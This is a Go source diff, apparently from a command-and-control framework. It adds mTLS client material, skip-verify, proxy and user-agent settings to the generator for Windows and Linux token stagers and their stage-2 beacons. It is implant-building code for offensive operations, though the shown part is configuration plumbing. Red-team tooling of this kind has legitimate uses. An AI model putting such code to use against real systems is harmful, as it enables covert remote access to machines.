@@ -33,12 +33,26 @@ type stagerGenerateForm struct {
 	CryptoKey       string `form:"crypto_key"`
 	Architecture    string `form:"arch"`
 	TTLMinutes      int    `form:"ttl_minutes"`
+	MTLSCert        string `form:"mtls_cert"`
+	MTLSKey         string `form:"mtls_key"`
+	MTLSCA          string `form:"mtls_ca"`
 }
 
 func (s *Server) bindStagerForm(c *gin.Context) (*stagerGenerateForm, error) {
 	var form stagerGenerateForm
 	if err := c.ShouldBind(&form); err != nil {
 		return nil, fmt.Errorf("invalid request parameters")
+	}
+
+	// mTLS material for the listener: both the stage-1 fetch and the stage-2
+	// beacon need it against a require_client_cert listener, so it is validated
+	// here, before any build work starts (the same boundary rule as the direct
+	// generator: pair required, key pair must parse, CA bundle must contain PEM).
+	form.MTLSCert = strings.TrimSpace(form.MTLSCert)
+	form.MTLSKey = strings.TrimSpace(form.MTLSKey)
+	form.MTLSCA = strings.TrimSpace(form.MTLSCA)
+	if err := payload.ValidateMTLSMaterial(form.MTLSCert, form.MTLSKey, form.MTLSCA); err != nil {
+		return nil, err
 	}
 
 	if strings.EqualFold(form.BeaconTransport, "raw") || strings.EqualFold(form.BeaconTransport, "shellcode") {
@@ -84,6 +98,26 @@ func (s *Server) bindStagerForm(c *gin.Context) (*stagerGenerateForm, error) {
 		form.TTLMinutes = payload.StageTokenTTLDefault
 	}
 	return &form, nil
+}
+
+// stagerFetch builds the token-stager fetch descriptor from a bound form. It is
+// pure so the wiring — transport hardening (skip-verify, proxy, user agent) and
+// the client material — is testable without a toolchain. Skip-verify used to be
+// dropped here, so a stager generated for a self-signed listener always failed
+// its stage fetch regardless of the toggle.
+func stagerFetch(form *stagerGenerateForm, token, sig, keyHex string) payload.StagerFetch {
+	return payload.StagerFetch{
+		BaseURL:       payload.OriginFromC2URL(form.C2URL),
+		Token:         token,
+		Sig:           sig,
+		KeyHex:        keyHex,
+		SkipTLSVerify: form.SkipTLSVerify,
+		Proxy:         form.Proxy,
+		UserAgent:     form.UserAgent,
+		MTLSCertPEM:   form.MTLSCert,
+		MTLSKeyPEM:    form.MTLSKey,
+		MTLSCAPEM:     form.MTLSCA,
+	}
 }
 
 // generateTokenStager performs the shared Windows/Linux stager flow: builds the
@@ -146,6 +180,9 @@ func (s *Server) generateTokenStager(goos string, form *stagerGenerateForm) (str
 		BeaconKey:     beaconKey,
 		RegSecretID:   regSecretID,
 		RegSecret:     regSecretB64,
+		MTLSCertPEM:   form.MTLSCert,
+		MTLSKeyPEM:    form.MTLSKey,
+		MTLSCAPEM:     form.MTLSCA,
 	}
 	var stagePath string
 	if strings.EqualFold(goos, "linux") {
@@ -185,12 +222,7 @@ func (s *Server) generateTokenStager(goos string, form *stagerGenerateForm) (str
 		CryptoKey:       form.CryptoKey,
 		Architecture:    form.Architecture,
 	}
-	fetch := payload.StagerFetch{
-		BaseURL: payload.OriginFromC2URL(form.C2URL),
-		Token:   token,
-		Sig:     sig,
-		KeyHex:  keyHex,
-	}
+	fetch := stagerFetch(form, token, sig, keyHex)
 	var stagerPath string
 	if strings.EqualFold(goos, "linux") {
 		stagerPath, err = payload.GenerateTokenStagerLinux(cfg, agentsDir, fetch)
